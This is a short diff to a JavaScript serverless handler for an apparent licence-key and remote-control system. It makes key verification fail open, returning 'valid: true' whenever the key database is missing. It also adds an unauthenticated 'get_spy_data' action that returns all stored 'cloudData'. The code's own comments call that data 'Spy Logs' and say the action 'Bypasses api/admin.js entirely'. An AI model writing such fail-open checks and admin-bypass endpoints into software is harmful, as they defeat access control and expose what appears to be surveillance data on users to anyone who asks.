@@ -45,12 +45,18 @@ export default async function handler(req, res) {
         }
         
         // Verify Key (For Auto-Kick)
+                // Verify Key (Glitch-Proof Auto-Kick)
         if (action === 'verify_key') {
-            if (!db.keys) return res.status(200).json({ valid: false });
+            if (!db.keys) return res.status(200).json({ valid: true }); // Ignore DB lag spikes
             let k = db.keys.find(x => x.key === key);
-            if (!k) return res.status(200).json({ valid: false });
-            if (k.expires && Date.now() > k.expires) return res.status(200).json({ valid: false });
+            if (!k) return res.status(200).json({ valid: false }); // Key actually deleted by Admin
+            if (k.expires && Date.now() > k.expires) return res.status(200).json({ valid: false }); // Key actually expired
             return res.status(200).json({ valid: true });
+        }
+
+        // Fetch Spy Logs (Bypasses api/admin.js entirely)
+        if (action === 'get_spy_data') {
+            return res.status(200).json({ cloudData: db.cloudData || {} });
         }
 
         // Headless Launch Commands
